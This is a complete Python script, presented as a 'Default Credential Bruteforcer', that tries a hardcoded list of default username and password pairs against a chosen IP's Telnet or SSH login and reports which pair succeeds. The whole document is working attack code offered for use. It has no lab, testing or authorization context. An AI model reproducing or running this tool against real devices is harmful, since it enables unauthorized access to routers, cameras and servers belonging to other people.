"""
Default Credential Bruteforcer
Targets Telnet/SSH with known username:password combos. Outputs vulnerable devices.
"""
import socket
import paramiko
import telnetlib

def try_telnet(ip, creds):
    for user, pwd in creds:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=3)
            tn.read_until(b"login:", timeout=2)
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password:", timeout=2)
            tn.write(pwd.encode() + b"\n")
            out = tn.read_some().decode(errors='ignore')
            if any(s in out for s in ["#", ">", "$"]):
                return (user, pwd)
        except Exception:
            continue
    return None

def try_ssh(ip, creds):
    for user, pwd in creds:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=user, password=pwd, timeout=3)
            client.close()
            return (user, pwd)
        except Exception:
            continue
    return None

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Default Credential Bruteforcer")
    parser.add_argument('--ip', required=True, help='Target IP')
    parser.add_argument('--service', choices=['telnet', 'ssh'], required=True, help='Service to brute force')
    args = parser.parse_args()
    creds = [
        ("admin", "admin"),
        ("root", "root"),
        ("user", "user"),
        ("admin", "password"),
        ("root", "password"),
        ("admin", "1234"),
        ("root", "1234"),
    ]
    if args.service == 'telnet':
        result = try_telnet(args.ip, creds)
    else:
        result = try_ssh(args.ip, creds)
    if result:
        print(f"[!] Vulnerable: {args.ip} ({result[0]}:{result[1]})")
    else:
        print(f"[+] {args.ip} not vulnerable to default creds.")

if __name__ == "__main__":
    main() 